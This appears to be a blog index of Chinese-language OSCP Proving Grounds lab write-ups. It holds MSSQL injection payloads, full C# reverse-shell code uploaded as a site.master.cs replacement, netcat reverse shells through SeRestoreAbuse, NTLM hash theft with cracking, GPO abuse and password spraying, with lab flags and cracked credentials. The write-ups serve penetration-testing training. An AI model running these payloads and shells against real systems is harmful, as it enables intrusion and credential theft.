admin'if((select+len(password_hash)+from+butch..users))\u003e=64+waitfor+delay+'0:0:1';-- # password列长度为64 admin'if((select+substring(password_hash,1,3)+from+butch..users))\u003e='a+waitfor+delay+'0:0:1';-- 因为长度太长了，就不手工跑了，用sqlmap跑下最后的结果 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch] └─$ sqlmap -r sqli.txt --level=3 --risk=3 -D butch -T users -C 'password_hash','username' --technique=T --dbms=mssql --dump --batch …… [18:08:47] [WARNING] no clear password(s) found Database: butch Table: users [1 entry] +------------------------------------------------------------------+----------+ | password_hash | username | +------------------------------------------------------------------+----------+ | e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 | butch | +------------------------------------------------------------------+----------+ …… ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch] └─$ hashid e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267 Analyzing 'e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267' [+] Snefru-256 [+] SHA-256 [+] RIPEMD-256 [+] Haval-256 [+] GOST R 34.11-94 [+] GOST CryptoPro S-Box [+] SHA3-256 [+] Skein-256 [+] Skein-512(256) 尝试破解Hash失败。 做完题后看了官方walkthrough，这里是通过sqlmap破解的密码Hash，不太明白怎么做到的。 Since the output contained a password hash, sqlmap offers to attempt to crack the hash with a common wordlist. We’ll respond with Y or yes to proceed. The attempt is successful, revealing a password of awesomedude. We can successfully authenticate to the web app with this password. 我本地的结果是没有跑出来的 这时候的另一种方法，就是通过SQL注入修改数据库。 重新设置一个密码，计算其sha256的值 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch] └─$ echo '123456' | sha256sum e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0 - 插入新记录失败 insert into users(password_hash,user_id,username) values ('e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0',2,'test'); 修改原有记录 UPDATE users SET password_hash='e150a1ec81e8e93e1eae2c3a77e66ec6dbd6a3b460f89c1d08aecf422ee401a0' WHERE username='butch'; 还是失败了，错误原因是echo '123456'这一步不对，echo默认情况下的输出是带有换行符的，导致计算的结果hash与预期不符。 重新计算Hash，再次修改原有记录： ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Butch] └─$ echo -n '123456' | sha256sum 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 - ;UPDATE users SET password_hash='8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WHERE username='butch'; 使用butch/123456成功登录Web后台，发现是个后台上传功能。 ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:3:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["靶场"],"content":"文件上传 正常情况下的文件上传功能点的思路就是上传webshell，或者覆盖某些配置文件。这里apsx等可执行文件后缀无法上传，Webshell思路走不通。配置文件这块又不太了解。 补充一下，通过上传txt等测试文件，最后在Web根目录下找到了这些文件，确认了这些文件的上传位置。 接下去的知识点都是新学的 Web服务下有个dev目录，包含了一个site.master.txt文件，疑似是源码的一个备份 \u003c%@ Language=\"C#\" src=\"site.master.cs\" Inherits=\"MyNamespaceMaster.MyClassMaster\" %\u003e \u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"\u003e \u003chtml xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\"\u003e \u003chead runat=\"server\"\u003e \u003ctitle\u003eButch\u003c/title\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /\u003e \u003cmeta name=\"application-name\" content=\"Butch\"\u003e \u003cmeta name=\"author\" content=\"Butch\"\u003e \u003cmeta name=\"description\" content=\"Butch\"\u003e \u003cmeta name=\"keywords\" content=\"Butch\"\u003e \u003clink media=\"all\" href=\"style.css\" rel=\"stylesheet\" type=\"text/css\" /\u003e \u003clink id=\"favicon\" rel=\"shortcut icon\" type=\"image/png\" href=\"favicon.png\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=\"wrap\"\u003e \u003cdiv id=\"header\"\u003eWelcome to Butch Repository\u003c/div\u003e \u003cdiv id=\"main\"\u003e \u003cdiv id=\"content\"\u003e \u003cbr /\u003e \u003casp:contentplaceholder id=\"ContentPlaceHolder1\" runat=\"server\"\u003e\u003c/asp:contentplaceholder\u003e \u003cbr /\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e 微软官方文档site.master 表明该文件为每个页面提供了一个模板在 ASP.NET MVC 风格的应用程序上。 这块C#的代码不了解，只知道引入了site.master.cs，接下去的思路就是替换这个文件，让它去执行恶意命令。 从这找了个demo进行上传，https://github.com/autofac/Examples/blob/master/src/WebFormsExample/Site.Master.cs using System; using System.Web.UI; namespace WebFormsExample { public partial class SiteMaster : MasterPage { protected void Page_Load(object sender, EventArgs e) { } } } 上传成功后，访问首页，首页报500错误，说明至少文件是替换成功了。 这里500之后好像只能重置环境，需要构造好恶意文件再上传。 恶意文件1 使用 reverse-shell-generator 生成 C#的反弹Shell代码 using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Linq; using System.Net; using System.Net.Sockets; namespace ConnectBack { public class Program { static StreamWriter streamWriter; public static void Main(string[] args) { using(TcpClient client = new TcpClient(\"192.168.45.164\", 4444)) { using(Stream stream = client.GetStream()) { using(StreamReader rdr = new StreamReader(stream)) { streamWriter = new StreamWriter(stream); StringBuilder strInput = new StringBuilder(); Process p = new Process(); p.StartInfo.FileName = \"powershell\"; p.StartInfo.CreateNoWindow = true; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardInput = true; p.StartInfo.RedirectStandardError = true; p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler); p.Start(); p.BeginOutputReadLine(); while(true) { strInput.Append(rdr.ReadLine()); //strInput.Append(\"\\n\"); p.StandardInput.WriteLine(strInput); strInput.Remove(0, strInput.Length); } } } } } private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine) { StringBuilder strOutput = new StringBuilder(); if (!String.IsNullOrEmpty(outLine.Data)) { try { strOutput.Append(outLine.Data); streamWriter.WriteLine(strOutput); streamWriter.Flush(); } catch (Exception err) { } } } } } 构造恶意文件： using System; using System.Web.UI; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Linq; using System.Net; using System.Net.Sockets; namespace MyNamespaceMaster { public partial class MyClassMaster : MasterPage { static StreamWriter streamWriter; protected void Page_Load(object sender, EventArgs e) { using(TcpClient client = new TcpClient(\"192.168.45.164\", 445)) { using(Stream stream = client.GetStream()) { using(StreamReader rdr = new StreamReader(stream)) { streamWriter = new StreamWriter(stream); StringBuilder strInput = new StringBuilder(); Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.CreateNoWindow = true; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardInput = true; p.StartInfo.RedirectStandardError = true; p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler); p.Start(); p.BeginOutputRe","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:3:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["靶场"],"content":"Flag butch/awesomedude type C:\\users\\administrator\\desktop\\proof.txt 8efb9ecaa9dd953e25de084f5db30648 type C:\\users\\butch\\desktop\\local.txt 0f5cfaf654fe39337300f602295effb4 ","date":"2024-02-12","objectID":"/posts/provinggrounds-butch/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Butch Writeup","uri":"/posts/provinggrounds-butch/"},{"categories":["靶场"],"content":"Vault 这是第23台，Windows系统，难度Hard，名称 Vault 192.168.202.172 ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["靶场"],"content":"PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.202.172 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-09 16:45 CST Nmap scan report for 192.168.202.172 Host is up (0.19s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-09 08:45:09Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.25 seconds 全端口扫描： ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.202.172 -T4 -p- [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-09 16:45 CST Nmap scan report for 192.168.202.172 Host is up (0.19s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-09 08:46:28Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49689/tcp open msrpc Microsoft Windows RPC 49704/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 115.86 seconds 域主机，域名：vault.offsec ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["靶场"],"content":"InitAccess ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["靶场"],"content":"SMB SMB匿名访问 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ smbclient -L //192.168.202.172/ -U '' Password for [WORKGROUP\\]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share DocumentsShare Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 192.168.202.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ crackmapexec smb 192.168.202.172 -u 'guest' -p '' --shares SMB 192.168.202.172 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False) SMB 192.168.202.172 445 DC [+] vault.offsec\\guest: SMB 192.168.202.172 445 DC [+] Enumerated shares SMB 192.168.202.172 445 DC Share Permissions Remark SMB 192.168.202.172 445 DC ----- ----------- ------ SMB 192.168.202.172 445 DC ADMIN$ Remote Admin SMB 192.168.202.172 445 DC C$ Default share SMB 192.168.202.172 445 DC DocumentsShare READ,WRITE SMB 192.168.202.172 445 DC IPC$ READ Remote IPC SMB 192.168.202.172 445 DC NETLOGON Logon server share SMB 192.168.202.172 445 DC SYSVOL Logon server share 可以看到 DocumentsShare 路径下有可写权限。尝试上传恶意文件到该目录下。 使用NTLM_Theft工具生成恶意文件. ┌──(xavier㉿kali)-[~/Hacksafe/4-权限提升/Windows/ntlm_theft] └─$ python3 ntlm_theft.py -g lnk -s 192.168.45.248 -f test Created: test/test.lnk (BROWSE TO FOLDER) Generation Complete. 上传到该目录下，responder等待回连 ──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ smbclient //192.168.202.172/DocumentsShare -U '' Password for [WORKGROUP\\]: Try \"help\" to get a list of possible commands. smb: \\\u003e put test.lnk putting file test.lnk as \\test.lnk (3.3 kb/s) (average 3.3 kb/s) ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ sudo responder -I tun0 …… [+] Listening for events... [SMB] NTLMv2-SSP Client : 192.168.202.172 [SMB] NTLMv2-SSP Username : VAULT\\anirudh [SMB] NTLMv2-SSP Hash : anirudh::VAULT:b016c3bc0a2a9b1ckipping previously captured hash for VAULT\\anirudh [*] Skipping previously captured hash for VAULT\\anirudh hashcat尝试破解 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ hashcat -m 5600 -a 0 1.hash /usr/share/wordlists/rockyou.txt --force --quiet ANIRUDH::VAULT:b016c3bc0a2a9b1c:8b6874393aea8cc736beaa79e7e1d231:010100000000000000dd12a6a05bda01b5b2f11259155f4a000000000200080051004b003700350001001e00570049004e002d00570041005a00460036004b0035004a0057004b00560004003400570049004e002d00570041005a00460036004b0035004a0057004b0056002e0051004b00370035002e004c004f00430041004c000300140051004b00370035002e004c004f00430041004c000500140051004b00370035002e004c004f00430041004c000700080000dd12a6a05bda010600040002000000080030003000000000000000010000000020000077eeb54469d1f6103ba0f72dc177ace44970d6fade091ca17405179482a7c5f20a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200340038000000000000000000:SecureHM 得到一组账号密码：anirudh/SecureHM 使用Evil-WinRM成功登录系统 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ evil-winrm -u anirudh -p SecureHM -i 192.168.202.172 …… *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e type C:\\Users\\anirudh\\Desktop\\local.txt 6379a394e97f465833bd2a2d72fe5d56 ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["靶场"],"content":"PrivE 检查当前用户权限，发现权限有很多： *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= =================================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeSystemtimePrivilege Change the system time Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["靶场"],"content":"SeRestorePrivilege 看到有这个权限，可以用于提权。 使用工具：SeRestoreAbuse，需要自己手动编译一下。 上传SeRestoreAbuse 和nc *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e upload SeRestoreAbuse.exe *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e upload nc64.exe *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e mkdir C:\\tmp\\ *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e copy nc64.exe C:\\tmp\\nc.exe 执行 SeRestoreAbuse 利用脚本 *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e ./SeRestoreAbuse.exe \"C:\\tmp\\nc.exe 192.168.45.248 4444 -e powershell\" RegCreateKeyExA result: 0 RegSetValueExA result: 0 另一边nc监听，因为SeRestoreAbuse这个工具执行一段时间后，可能会报错导致shell中断，再做一次转发就好了 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.45.248] from (UNKNOWN) [192.168.202.172] 51849 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e C:\\tmp\\nc.exe 192.168.45.248 5555 -e powershell C:\\tmp\\nc.exe 192.168.45.248 5555 -e powershell ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ nc -nlvp 5555 listening on [any] 5555 ... connect to [192.168.45.248] from (UNKNOWN) [192.168.202.172] 51852 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e whoami whoami nt authority\\system PS C:\\Windows\\system32\u003e type C:\\users\\administrator\\desktop\\proof.txt type C:\\users\\administrator\\desktop\\proof.txt 12ef329cf77b22fb67e52b389022be6d ./SeRestoreAbuse.exe \"C:\\tmp\\nc.exe 192.168.45.248 4444 -e powershell\" C:\\tmp\\nc.exe 192.168.45.248 5555 -e powershell ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:4:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["靶场"],"content":"GPO Abuse 检查当前用户是否具备修改组策略的权限。 将PowerView 放到Evil-WinRM的执行目录下 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 . ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ ls 1.hash PowerView.ps1 接下来, 使用Evil-WinRM 和 -s 参数重新连接，以便访问当前目录中的 PowerShell 脚本。 *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e exit Info: Exiting with code 0 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Vault] └─$ evil-winrm -u anirudh -p SecureHM -i 192.168.202.172 -s . …… *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e PowerView.ps1 组策略枚举 使用 Get-NetGPO 列出 GPOs（Group Policy Objects），获取GUID *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e PowerView.ps1 *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e Get-NetGPO usncreated : 5672 systemflags : -1946157056 displayname : Default Domain Policy gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00 C04FB94F17}] whenchanged : 11/19/2021 9:00:32 AM objectclass : {top, container, groupPolicyContainer} gpcfunctionalityversion : 2 showinadvancedviewonly : True usnchanged : 12778 dscorepropagationdata : {11/19/2021 9:00:32 AM, 11/19/2021 8:51:14 AM, 1/1/1601 12:00:00 AM} name : {31B2F340-016D-11D2-945F-00C04FB984F9} flags : 0 cn : {31B2F340-016D-11D2-945F-00C04FB984F9} iscriticalsystemobject : True gpcfilesyspath : \\\\vault.offsec\\sysvol\\vault.offsec\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9} distinguishedname : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec whencreated : 11/19/2021 8:50:33 AM versionnumber : 4 instancetype : 4 objectguid : 93130581-3375-49c7-88d3-afdc915a9526 objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vault,DC=offsec usncreated : 5675 systemflags : -1946157056 displayname : Default Domain Controllers Policy gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}] whenchanged : 11/19/2021 8:50:33 AM objectclass : {top, container, groupPolicyContainer} gpcfunctionalityversion : 2 showinadvancedviewonly : True usnchanged : 5675 dscorepropagationdata : {11/19/2021 8:51:14 AM, 1/1/1601 12:00:00 AM} name : {6AC1786C-016F-11D2-945F-00C04fB984F9} flags : 0 cn : {6AC1786C-016F-11D2-945F-00C04fB984F9} iscriticalsystemobject : True gpcfilesyspath : \\\\vault.offsec\\sysvol\\vault.offsec\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9} distinguishedname : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=vault,DC=offsec whencreated : 11/19/2021 8:50:33 AM versionnumber : 1 instancetype : 4 objectguid : 0ccc30ba-3bef-43ac-9c61-ebb814e9a685 objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vault,DC=offsec 使用 Get-GPPermission 检查默认组策略（Default Group Policy）的权限。 *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh Trustee : anirudh TrusteeType : User Permission : GpoEditDeleteModifySecurity Inherited : False “Permission”表明 anirudh 用户编辑、删除和修改此策略的权限。可以使用 SharpGPOAbuse 工具来利用这种错误配置。 下载SharpGPOAbuse: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe ┌──(xavier㉿kali)-[~/Desktop/OSCP/tools/win] └─$ wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe 上传到目标主机 *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e upload SharpGPOAbuse.exe Info: Uploading SharpGPOAbuse.exe to C:\\Users\\anirudh\\Documents\\SharpGPOAbuse.exe Data: 94208 bytes of 94208 bytes copied Info: Upload successful! 执行 SharpGPOAbuse.exe，将anirudh用户帐户添加到本地管理员组，传递用户名，并传递我们具有写入权限的组策略。 *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName \"Default Domain Policy\" [+] Domain = vault.offsec [+] Domain Controller = ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:4:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["靶场"],"content":"flag anirudh/SecureHM type C:\\Users\\anirudh\\Desktop\\local.txt 6379a394e97f465833bd2a2d72fe5d56 type C:\\users\\administrator\\desktop\\proof.txt 12ef329cf77b22fb67e52b389022be6d ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["靶场"],"content":"Nagoya 这是第22台，Windows系统，难度Hard，名称 Nagoya 192.168.166.21 ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.166.21 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-07 15:09 CST Nmap scan report for 192.168.166.21 Host is up (0.25s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-07 07:09:23Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 3389/tcp open ms-wbt-server Microsoft Terminal Services Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.86 seconds ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"InitAccess ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"80-Web 发现80的Web服务重有个Team页面，包含了团队成员 根据这个页面制作字典，我最初设计的字典格式是：Emma Miah， Emma.Miah， EmmaMiah 三种格式 使用Kerbrute验证有效的域用户： ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ kerbrute -domain nagoya-industries.com -users ./teams.txt -dc-ip 192.168.166.21 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Valid user =\u003e Matthew.Harrison [*] Valid user =\u003e Emma.Miah [*] Valid user =\u003e Rebecca.Bell [*] Valid user =\u003e Scott.Gardner [*] Valid user =\u003e Terry.Edwards [*] Valid user =\u003e Holly.Matthews [*] Valid user =\u003e Anne.Jenkins [*] Valid user =\u003e Brett.Naylor [*] Valid user =\u003e Melissa.Mitchell [*] Valid user =\u003e Craig.Carr [*] Valid user =\u003e Fiona.Clark [*] Valid user =\u003e Patrick.Martin [*] Valid user =\u003e Kate.Watson [*] Valid user =\u003e Kirsty.Norris [*] Valid user =\u003e Andrea.Hayes [*] Valid user =\u003e Abigail.Hughes [*] Valid user =\u003e Melanie.Watson [*] Valid user =\u003e Frances.Ward [*] Valid user =\u003e Sylvia.King [*] Valid user =\u003e Wayne.Hartley [*] Valid user =\u003e Iain.White [*] Valid user =\u003e Joanna.Wood [*] Valid user =\u003e Bethan.Webster [*] Valid user =\u003e Elaine.Brady [*] Valid user =\u003e Christopher.Lewis [*] Valid user =\u003e Megan.Johnson [*] Valid user =\u003e Damien.Chapman [*] Valid user =\u003e Joanne.Lewis [*] No passwords were discovered :'( ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"Hint-1 Foothold 1 Build a username wordlist with the names found in the web app, you can try conventions like Offsec.Labs . Spraying easy password combinations like seasons + years is always a good start. ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["靶场"],"content":"SMB-445 根据提示，构建密码字典，如：Spring2023、Summer2023、Autumn2023、Winter2023等。 这里不看提示真的很难。 SMB枚举： ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] └─$ crackmapexec smb 192.168.166.21 -u ./users.txt -p 'Summer2023' --shares SMB 192.168.166.21 445 NAGOYA [*] Windows 10.0 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False) SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Matthew.Harrison:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Emma.Miah:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Rebecca.Bell:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Scott.Gardner:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Terry.Edwards:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Holly.Matthews:Summer2023 STATUS_LOGON_FAILURE SMB 